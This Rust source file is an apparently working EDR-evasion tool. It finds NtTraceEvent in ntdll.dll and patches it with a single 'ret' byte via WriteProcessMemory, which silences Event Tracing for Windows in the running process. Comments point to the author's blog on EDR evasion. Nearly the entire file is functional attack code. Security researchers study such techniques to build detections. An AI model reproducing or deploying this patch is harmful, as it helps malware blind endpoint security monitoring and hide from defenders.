use std::{arch::asm, ffi::c_void, mem};

use export_resolver::ExportList;
use windows::Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess}};

fn main() {
    // Get reference to NtTraceEvent
    // Using my library export-resolver. I have published this library to crates.io, for more info
    // check my blog: https://fluxsec.red/rust-edr-evasion-hells-gate
    let mut exports = ExportList::new();

    exports.add("ntdll.dll", "NtTraceEvent").expect("[-] Error finding address of NtTraceEvent");

    // retrieve the virtual address of NtTraceEvent
    let nt_trace_addr = exports.get_function_address("NtTraceEvent").expect("[-] Unable to retrieve address of NtTraceEvent.") as *const c_void;

    // get a handle to the current process
    let handle = unsafe {GetCurrentProcess()};

    // set up variables for WriteProcessMemory
    let ret_opcode: u8 = 0xC3; // ret opcode for x86
    // let ptr_loc = std::ptr::addr_of!(ret_opcode);
    let size = mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    // unsafe { println!("Addr: {:p}, value: {:x}, size: {}.", ptr_loc, *ptr_loc, size) };

    // patch the function 
    let res = unsafe {
        WriteProcessMemory(handle, 
            nt_trace_addr,
            &ret_opcode as *const u8 as *const c_void, 
            size, 
            Some(&mut bytes_written as *mut usize),
        )
    };

    // interrupt breakpoint 
    // unsafe { asm!("int3") };

    match res {
        Ok(_) => {
            println!("[+] Success data written. Number of bytes: {:?} at address: {:p}", bytes_written, nt_trace_addr);
        },
        Err(_) => {
            let e = unsafe { GetLastError() };
            panic!("[-] Error with WriteProcessMemory: {:?}", e);
        },
    }    
}